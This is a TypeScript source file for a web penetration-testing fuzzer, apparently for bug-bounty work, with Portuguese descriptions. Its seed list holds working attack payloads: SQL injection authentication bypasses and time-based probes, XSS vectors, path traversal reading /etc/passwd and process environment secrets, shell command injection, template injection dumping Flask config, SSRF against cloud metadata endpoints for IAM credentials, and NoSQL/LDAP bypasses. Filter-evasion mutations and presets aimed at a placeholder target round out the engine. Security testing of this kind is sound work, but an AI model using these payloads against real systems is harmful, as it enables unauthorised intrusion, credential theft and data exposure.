/**
 * Payload Fuzzer Engine
 * Comprehensive security mutation & fuzzing engine for manual and semi-automated web application penetration testing.
 * Covers SQLi, XSS, Path Traversal / LFI, OS Command Injection, SSTI, SSRF, and NoSQL/LDAP.
 */

export type FuzzCategory = 
  | 'SQLI' 
  | 'XSS' 
  | 'PATH_TRAVERSAL' 
  | 'COMMAND_INJECTION' 
  | 'SSTI' 
  | 'SSRF' 
  | 'NOSQL_LDAP';

export type PlacementMode = 'MARKER' | 'SUFFIX' | 'PREFIX' | 'REPLACE' | 'QUOTE_WRAP';

export type MutationType = 
  | 'raw'
  | 'url_encode'
  | 'double_url_encode'
  | 'all_char_url'
  | 'case_alternate'
  | 'whitespace_tamper'
  | 'null_byte'
  | 'quote_tamper'
  | 'unicode_homoglyph'
  | 'html_entity';

export interface FuzzSeed {
  id: string;
  category: FuzzCategory;
  name: string;
  payload: string;
  description: string;
  targetContext: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
}

export interface MutationOption {
  id: MutationType;
  name: string;
  description: string;
  enabled: boolean;
  badge: string;
}

export interface GeneratedFuzzItem {
  id: string;
  category: FuzzCategory;
  categoryLabel: string;
  techniqueName: string;
  originalSeed: string;
  mutationType: MutationType;
  mutationLabel: string;
  fuzzedString: string;
  length: number;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
}

export const FUZZ_CATEGORIES: Array<{
  id: FuzzCategory;
  name: string;
  shortLabel: string;
  color: string;
  badgeClass: string;
  description: string;
}> = [
  {
    id: 'SQLI',
    name: 'SQL Injection (SQLi)',
    shortLabel: 'SQLi',
    color: '#ef4444',
    badgeClass: 'bg-red-500/20 text-red-300 border-red-500/30',
    description: 'Auth bypass, UNION SELECT, time-based blind (pg_sleep/SLEEP), stacked queries e comentários de evasão.'
  },
  {
    id: 'XSS',
    name: 'Cross-Site Scripting (XSS)',
    shortLabel: 'XSS',
    color: '#eab308',
    badgeClass: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30',
    description: 'DOM/Reflected XSS, eventos inline (onload, onerror), SVG polyglots, template literals e bypass de filtros.'
  },
  {
    id: 'PATH_TRAVERSAL',
    name: 'Path Traversal / LFI',
    shortLabel: 'Traversal',
    color: '#f97316',
    badgeClass: 'bg-orange-500/20 text-orange-300 border-orange-500/30',
    description: 'Dot-dot-slash (../), backslashes (..\\), encodings aninhados, null bytes e caminhos sensíveis do SO.'
  },
  {
    id: 'COMMAND_INJECTION',
    name: 'OS Command Injection (RCE)',
    shortLabel: 'CMDi',
    color: '#dc2626',
    badgeClass: 'bg-rose-500/20 text-rose-300 border-rose-500/30',
    description: 'Operadores de encadeamento (; | || && &), subshells $(), crases, expansão de variáveis e quebras de linha.'
  },
  {
    id: 'SSTI',
    name: 'Server-Side Template Injection',
    shortLabel: 'SSTI',
    color: '#a855f7',
    badgeClass: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
    description: 'Expressões matemáticas e injeção de templates Jinja2, Twig, Freemarker, Spring SpEL e ERB.'
  },
  {
    id: 'SSRF',
    name: 'Server-Side Request Forgery',
    shortLabel: 'SSRF',
    color: '#06b6d4',
    badgeClass: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
    description: 'Evasões de IP de metadados de nuvem (169.254.169.254), notação decimal, octal, IPv6 e loopback localhost.'
  },
  {
    id: 'NOSQL_LDAP',
    name: 'NoSQL & LDAP Injection',
    shortLabel: 'NoSQL/LDAP',
    color: '#3b82f6',
    badgeClass: 'bg-blue-500/20 text-blue-300 border-blue-500/30',
    description: 'Operadores NoSQL MongoDB ($ne, $gt, $regex) e caracteres de escape de filtros LDAP (*, )(cn=*)).'
  }
];

export const DEFAULT_FUZZ_SEEDS: FuzzSeed[] = [
  // --- SQLi ---
  {
    id: 'sqli-1',
    category: 'SQLI',
    name: 'Generic Auth Bypass OR 1=1',
    payload: "' OR '1'='1",
    description: 'Clássico escape de aspas simples com condição booleana tautológica verdadeira.',
    targetContext: 'Auth Login / Search Input',
    severity: 'CRITICAL'
  },
  {
    id: 'sqli-2',
    category: 'SQLI',
    name: 'Numeric Auth Bypass OR 1=1--',
    payload: '1 OR 1=1--',
    description: 'Bypass para campos numéricos com comentário delimitador SQL padrão.',
    targetContext: 'Numeric ID query parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'sqli-3',
    category: 'SQLI',
    name: 'MySQL Comment Delimiter #',
    payload: "' OR 1=1#",
    description: 'Escape de aspas com caractere de comentário estilo hash para MySQL e MariaDB.',
    targetContext: 'MySQL form input',
    severity: 'HIGH'
  },
  {
    id: 'sqli-4',
    category: 'SQLI',
    name: 'UNION SELECT Column Enumeration',
    payload: "' UNION SELECT null,null,null--",
    description: 'Injeção UNION com colunas nulas para descobrir largura do conjunto de resultados.',
    targetContext: 'Result listing endpoint',
    severity: 'HIGH'
  },
  {
    id: 'sqli-5',
    category: 'SQLI',
    name: 'Time-Based Blind MySQL (SLEEP)',
    payload: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    description: 'Verificação de execução cega com atraso forçado de 5 segundos no MySQL.',
    targetContext: 'Blind parameter without feedback',
    severity: 'HIGH'
  },
  {
    id: 'sqli-6',
    category: 'SQLI',
    name: 'Time-Based Blind PostgreSQL (pg_sleep)',
    payload: "1'; SELECT pg_sleep(5)--",
    description: 'Injeção de consulta em pilha com função pg_sleep no PostgreSQL.',
    targetContext: 'Stacked query parameter',
    severity: 'HIGH'
  },
  {
    id: 'sqli-7',
    category: 'SQLI',
    name: 'Order By Null Sorting Probe',
    payload: "1' ORDER BY 10--",
    description: 'Detecção de número máximo de colunas ordenáveis via cláusula ORDER BY.',
    targetContext: 'Sort / Order parameter',
    severity: 'MEDIUM'
  },

  // --- XSS ---
  {
    id: 'xss-1',
    category: 'XSS',
    name: 'Classic Script Alert Tag',
    payload: '<script>alert(document.domain)</script>',
    description: 'Injeção clássica de tag script com extração do domínio de execução.',
    targetContext: 'HTML Body context',
    severity: 'HIGH'
  },
  {
    id: 'xss-2',
    category: 'XSS',
    name: 'Image OnError Fallback',
    payload: '<img src=x onerror=alert(1)>',
    description: 'Tag de imagem com URL inválida disparando o manipulador de erro JavaScript inline.',
    targetContext: 'Attribute / Tag filter bypass',
    severity: 'HIGH'
  },
  {
    id: 'xss-3',
    category: 'XSS',
    name: 'SVG OnLoad Vector',
    payload: '<svg onload=alert(1)>',
    description: 'Vetor moderno baseado em SVG e evento onload, frequentemente aceito em sanitizers fracos.',
    targetContext: 'Rich text or SVG upload',
    severity: 'HIGH'
  },
  {
    id: 'xss-4',
    category: 'XSS',
    name: 'Attribute Breakout (Double Quote)',
    payload: '" onfocus="alert(1)" autofocus="',
    description: 'Escape de atributo de tag HTML (ex: input value="") com gatilho automático via autofocus.',
    targetContext: 'Input value="[FUZZ]"',
    severity: 'HIGH'
  },
  {
    id: 'xss-5',
    category: 'XSS',
    name: 'JavaScript URI Pseudo-Protocol',
    payload: 'javascript:alert(1)',
    description: 'Execução via atributo href ou src em links e redirecionamentos controlados pelo usuário.',
    targetContext: '<a href="[FUZZ]">',
    severity: 'MEDIUM'
  },
  {
    id: 'xss-6',
    category: 'XSS',
    name: 'Template Literal Execution',
    payload: '`${alert(1)}`',
    description: 'Injeção dentro de template strings do JavaScript no frontend.',
    targetContext: 'Script block variable interpolation',
    severity: 'HIGH'
  },

  // --- Path Traversal / LFI ---
  {
    id: 'lfi-1',
    category: 'PATH_TRAVERSAL',
    name: 'Standard Relative Traversal 6-Deep',
    payload: '../../../../../../etc/passwd',
    description: 'Recursão de 6 níveis para leitura do arquivo de contas de usuários em sistemas Linux.',
    targetContext: 'File download / View route',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-2',
    category: 'PATH_TRAVERSAL',
    name: 'Windows System File Win.ini',
    payload: '..\\..\\..\\..\\..\\..\\windows\\win.ini',
    description: 'Travessia de diretório com barras invertidas visando sistema operacional Windows.',
    targetContext: 'File path on Windows hosts',
    severity: 'HIGH'
  },
  {
    id: 'lfi-3',
    category: 'PATH_TRAVERSAL',
    name: 'Nested Bypass Sequence (..././)',
    payload: '....//....//....//....//etc/passwd',
    description: 'Evasão de filtros simples que removem apenas "../" sem recursão profunda.',
    targetContext: 'Sanitized path string',
    severity: 'HIGH'
  },
  {
    id: 'lfi-4',
    category: 'PATH_TRAVERSAL',
    name: 'PHP Filter Base64 Resource Read',
    payload: 'php://filter/convert.base64-encode/resource=index.php',
    description: 'Wrapper nativo do PHP para exfiltração do código fonte sem execução.',
    targetContext: 'PHP include / require endpoints',
    severity: 'CRITICAL'
  },
  {
    id: 'lfi-5',
    category: 'PATH_TRAVERSAL',
    name: 'Linux Process Environment Probe',
    payload: '../../../../../../proc/self/environ',
    description: 'Acesso a variáveis de ambiente e segredos de processo no Linux.',
    targetContext: 'Linux OS file reading',
    severity: 'CRITICAL'
  },

  // --- OS Command Injection ---
  {
    id: 'cmd-1',
    category: 'COMMAND_INJECTION',
    name: 'Semicolon Command Chaining (id)',
    payload: '; id;',
    description: 'Separação de comandos no shell bash/sh com ponto e vírgula.',
    targetContext: 'System ping or tool runner',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-2',
    category: 'COMMAND_INJECTION',
    name: 'Pipe Chaining Operator (| whoami)',
    payload: '| whoami',
    description: 'Redirecionamento de saída para execução arbitrária do comando whoami.',
    targetContext: 'CLI pipe inputs',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-3',
    category: 'COMMAND_INJECTION',
    name: 'Subshell Execution $(id)',
    payload: '$(id)',
    description: 'Interpolação de subshell POSIX para execução de comandos dentro de argumentos.',
    targetContext: 'Quoted command parameter',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-4',
    category: 'COMMAND_INJECTION',
    name: 'Backtick Execution `id`',
    payload: '`id`',
    description: 'Execução legada de comandos via crases em interpretadores Unix.',
    targetContext: 'String parameter passed to shell',
    severity: 'CRITICAL'
  },
  {
    id: 'cmd-5',
    category: 'COMMAND_INJECTION',
    name: 'Whitespace Bypass with IFS ($IFS$9id)',
    payload: ';cat$IFS$9/etc/passwd;',
    description: 'Bypass de filtros de espaço usando a variável interna Internal Field Separator.',
    targetContext: 'Space-restricted shell parameter',
    severity: 'CRITICAL'
  },

  // --- SSTI ---
  {
    id: 'ssti-1',
    category: 'SSTI',
    name: 'Jinja2 / Twig Math Probe {{7*7}}',
    payload: '{{7*7}}',
    description: 'Expressão de teste universal; se retornar "49", indica template engine ativo.',
    targetContext: 'Email template / User nickname',
    severity: 'HIGH'
  },
  {
    id: 'ssti-2',
    category: 'SSTI',
    name: 'Spring / FreeMarker Variable ${7*7}',
    payload: '${7*7}',
    description: 'Sintaxe baseada em dólar e chaves comum em Java Spring Expression Language.',
    targetContext: 'Java web apps / JSP templates',
    severity: 'HIGH'
  },
  {
    id: 'ssti-3',
    category: 'SSTI',
    name: 'Ruby ERB Syntax <%= 7*7 %>',
    payload: '<%= 7*7 %>',
    description: 'Tags de interpolação em Ruby on Rails Embedded Ruby.',
    targetContext: 'Ruby template engines',
    severity: 'HIGH'
  },
  {
    id: 'ssti-4',
    category: 'SSTI',
    name: 'Jinja2 Python Config Exfiltration',
    payload: '{{config.items()}}',
    description: 'Leitura do dicionário de configurações e segredos do Flask/Jinja2.',
    targetContext: 'Flask / Python Jinja2',
    severity: 'CRITICAL'
  },

  // --- SSRF ---
  {
    id: 'ssrf-1',
    category: 'SSRF',
    name: 'AWS IMDSv1 Metadata IP',
    payload: 'http://169.254.169.254/latest/meta-data/',
    description: 'Acesso direto ao serviço de metadados da AWS para extração de credenciais de IAM Roles.',
    targetContext: 'Webhook URL / Image fetcher',
    severity: 'CRITICAL'
  },
  {
    id: 'ssrf-2',
    category: 'SSRF',
    name: 'Localhost IPv4 Loopback (127.0.0.1)',
    payload: 'http://127.0.0.1:8080/admin',
    description: 'Acesso a portas e serviços internos não expostos à internet pública.',
    targetContext: 'URL parameter fetch',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-3',
    category: 'SSRF',
    name: 'Decimal DWORD IP (2130706433)',
    payload: 'http://2130706433:80/',
    description: 'Evasão de filtros de regex de IP convertendo 127.0.0.1 para representação numérica inteira.',
    targetContext: 'Regex-protected URL field',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-4',
    category: 'SSRF',
    name: 'Hexadecimal IP (0x7f000001)',
    payload: 'http://0x7f000001/',
    description: 'Evasão de validação de hostname convertendo endereço de loopback para base hexadecimal.',
    targetContext: 'URL validation bypass',
    severity: 'HIGH'
  },
  {
    id: 'ssrf-5',
    category: 'SSRF',
    name: 'GCP Metadata with Required Header',
    payload: 'http://metadata.google.internal/computeMetadata/v1/',
    description: 'Endpoint de metadados do Google Cloud Platform para instâncias Compute Engine.',
    targetContext: 'GCP Cloud environment',
    severity: 'CRITICAL'
  },

  // --- NoSQL & LDAP ---
  {
    id: 'nosql-1',
    category: 'NOSQL_LDAP',
    name: 'MongoDB Not-Equal ($ne: null)',
    payload: '{"$ne": null}',
    description: 'Operador de comparação do MongoDB que avalia para verdadeiro em qualquer documento com o campo presente.',
    targetContext: 'JSON auth payload {"password": [FUZZ]}',
    severity: 'CRITICAL'
  },
  {
    id: 'nosql-2',
    category: 'NOSQL_LDAP',
    name: 'MongoDB Greater-Than Query ($gt: "")',
    payload: '{"$gt": ""}',
    description: 'Avalia qualquer string não vazia para autenticação sem conhecer a senha real.',
    targetContext: 'NoSQL credentials query',
    severity: 'CRITICAL'
  },
  {
    id: 'nosql-3',
    category: 'NOSQL_LDAP',
    name: 'LDAP Wildcard Filter Bypass (*)',
    payload: '*)(uid=*))(|(uid=*',
    description: 'Injeção de filtros LDAP para anular condições de busca e retornar todos os registros de diretório.',
    targetContext: 'Corporate LDAP login form',
    severity: 'HIGH'
  }
];

export const DEFAULT_MUTATION_OPTIONS: MutationOption[] = [
  {
    id: 'raw',
    name: 'Raw / Baseline',
    description: 'Mantém o payload original exato sem alterações.',
    enabled: true,
    badge: 'Original'
  },
  {
    id: 'url_encode',
    name: 'URL Encode (Single)',
    description: 'Converte caracteres especiais em %XX (ex: espaço -> %20, aspas -> %27).',
    enabled: true,
    badge: '%20 / %27'
  },
  {
    id: 'double_url_encode',
    name: 'Double URL Encode',
    description: 'Aplica codificação de URL duas vezes consecutivas para contornar proxies e WAFs.',
    enabled: true,
    badge: '%2520'
  },
  {
    id: 'all_char_url',
    name: 'All-Chars URL Encode',
    description: 'Codifica 100% dos caracteres, inclusive alfanuméricos normais em formato %hex.',
    enabled: false,
    badge: '%41%42%43'
  },
  {
    id: 'case_alternate',
    name: 'Case Alternation (Tamper)',
    description: 'Alterna maiúsculas e minúsculas (ex: sElEcT, uNiOn, sCrIpT) contra assinaturas regex.',
    enabled: true,
    badge: 'sElEcT'
  },
  {
    id: 'whitespace_tamper',
    name: 'Whitespace Tampering',
    description: 'Substitui espaços comuns por comentários SQL (/**/) ou quebras de linha (%0a).',
    enabled: true,
    badge: '/**/ & %0a'
  },
  {
    id: 'null_byte',
    name: 'Null Byte Injection',
    description: 'Anexa %00 ou \\x00 para testar terminação antecipada de strings e bypass de extensão.',
    enabled: false,
    badge: '%00'
  },
  {
    id: 'quote_tamper',
    name: 'Quote & Bracket Wrap',
    description: 'Envolve e escapa o payload com aspas simples, duplas e parênteses para quebrar sintaxe.',
    enabled: true,
    badge: `'\'' / ")"`
  },
  {
    id: 'unicode_homoglyph',
    name: 'Unicode Fullwidth Homoglyphs',
    description: 'Converte caracteres como <, >, /, \\ para homóglifos de largura total (＜, ＞, ／).',
    enabled: false,
    badge: '＜script＞'
  },
  {
    id: 'html_entity',
    name: 'HTML Entity Encode',
    description: 'Converte caracteres em entidades decimais e hexadecimais (&lt;, &#x27;).',
    enabled: false,
    badge: '&#x27;'
  }
];

/**
 * Mutation Transform Functions
 */
export function applyMutation(payload: string, mutationType: MutationType): string {
  switch (mutationType) {
    case 'raw':
      return payload;

    case 'url_encode':
      return encodeURIComponent(payload);

    case 'double_url_encode':
      return encodeURIComponent(encodeURIComponent(payload));

    case 'all_char_url':
      return payload
        .split('')
        .map(char => '%' + char.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase())
        .join('');

    case 'case_alternate':
      return payload
        .split('')
        .map((char, index) => (index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()))
        .join('');

    case 'whitespace_tamper':
      // If contains space, substitute with SQL comment /**/
      if (payload.includes(' ')) {
        return payload.replace(/ /g, '/**/');
      }
      return payload + '/**/';

    case 'null_byte':
      return payload + '%00';

    case 'quote_tamper':
      return `') OR ('1'='1' -- ` + payload;

    case 'unicode_homoglyph':
      return payload
        .replace(/</g, '＜')
        .replace(/>/g, '＞')
        .replace(/\//g, '／')
        .replace(/\\/g, '＼')
        .replace(/'/g, '＇')
        .replace(/"/g, '＂');

    case 'html_entity':
      return payload
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');

    default:
      return payload;
  }
}

/**
 * Injects a mutated payload into the base string according to placement mode
 */
export function injectPayloadIntoBase(
  base: string,
  mutatedPayload: string,
  mode: PlacementMode
): string {
  if (!base) return mutatedPayload;

  const markers = ['{FUZZ}', '§FUZZ§', '§§', '{{FUZZ}}', '[FUZZ]'];
  const foundMarker = markers.find(m => base.includes(m));

  if (mode === 'MARKER' && foundMarker) {
    return base.replace(foundMarker, mutatedPayload);
  }

  // If user selected MARKER but no marker exists in base, default to smart placement:
  if (mode === 'MARKER' && !foundMarker) {
    // If base looks like a URL query param (ends with '='), append directly
    if (base.endsWith('=')) {
      return base + mutatedPayload;
    }
    // If base has query params, append to last one or add &fuzz=
    if (base.includes('?')) {
      return base + mutatedPayload;
    }
    return base + mutatedPayload;
  }

  switch (mode) {
    case 'SUFFIX':
      return base + mutatedPayload;
    case 'PREFIX':
      return mutatedPayload + base;
    case 'REPLACE':
      return mutatedPayload;
    case 'QUOTE_WRAP':
      return `${base}' + ${mutatedPayload} + '`;
    default:
      return base + mutatedPayload;
  }
}

/**
 * Generates all fuzzed test items based on active categories, active mutations and base string
 */
export function generateFuzzItems(
  baseString: string,
  placementMode: PlacementMode,
  selectedCategories: Set<FuzzCategory>,
  selectedMutations: Set<MutationType>,
  customSeeds: FuzzSeed[] = []
): GeneratedFuzzItem[] {
  const allSeeds = [...DEFAULT_FUZZ_SEEDS, ...customSeeds];
  const activeSeeds = allSeeds.filter(s => selectedCategories.has(s.category));
  const activeMutationList = DEFAULT_MUTATION_OPTIONS.filter(m => selectedMutations.has(m.id));

  const items: GeneratedFuzzItem[] = [];

  activeSeeds.forEach(seed => {
    activeMutationList.forEach(mutation => {
      const mutatedPayload = applyMutation(seed.payload, mutation.id);
      const finalFuzzedString = injectPayloadIntoBase(baseString, mutatedPayload, placementMode);

      const categoryMeta = FUZZ_CATEGORIES.find(c => c.id === seed.category);

      items.push({
        id: `${seed.id}-${mutation.id}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
        category: seed.category,
        categoryLabel: categoryMeta?.shortLabel || seed.category,
        techniqueName: seed.name,
        originalSeed: seed.payload,
        mutationType: mutation.id,
        mutationLabel: mutation.name,
        fuzzedString: finalFuzzedString,
        length: finalFuzzedString.length,
        severity: seed.severity,
        description: seed.description
      });
    });
  });

  return items;
}

/**
 * Quick presets for real-world application testing
 */
export const FUZZ_PRESETS = [
  {
    id: 'preset-url-param',
    name: 'URL Query Parameter',
    base: 'https://alvo-bugbounty.com/api/v1/search?q={FUZZ}&limit=10',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'XSS', 'COMMAND_INJECTION', 'SSTI'] as FuzzCategory[],
    description: 'Injeta no parâmetro "q" de busca em requisições GET HTTP.'
  },
  {
    id: 'preset-json-auth',
    name: 'JSON Auth & Body',
    base: '{"username": "admin", "password": "{FUZZ}", "remember": true}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'NOSQL_LDAP', 'COMMAND_INJECTION'] as FuzzCategory[],
    description: 'Injeção dentro de credenciais em APIs REST / JSON.'
  },
  {
    id: 'preset-file-download',
    name: 'File Path / LFI Download',
    base: 'https://alvo-bugbounty.com/download.php?file={FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['PATH_TRAVERSAL', 'COMMAND_INJECTION'] as FuzzCategory[],
    description: 'Exploração de leitura arbitrária de arquivos de sistema e LFI.'
  },
  {
    id: 'preset-ssrf-webhook',
    name: 'Webhook & Callback SSRF',
    base: 'https://alvo-bugbounty.com/api/integrations/webhook?callback_url={FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SSRF'] as FuzzCategory[],
    description: 'Auditoria de requisições do lado do servidor contra metadados de nuvem.'
  },
  {
    id: 'preset-raw-polyglot',
    name: 'Raw Injection String (No Wrapper)',
    base: '{FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'XSS', 'PATH_TRAVERSAL', 'COMMAND_INJECTION', 'SSTI'] as FuzzCategory[],
    description: 'Gera strings puras para colar no Burp Intruder ou terminais de teste manual.'
  }
];
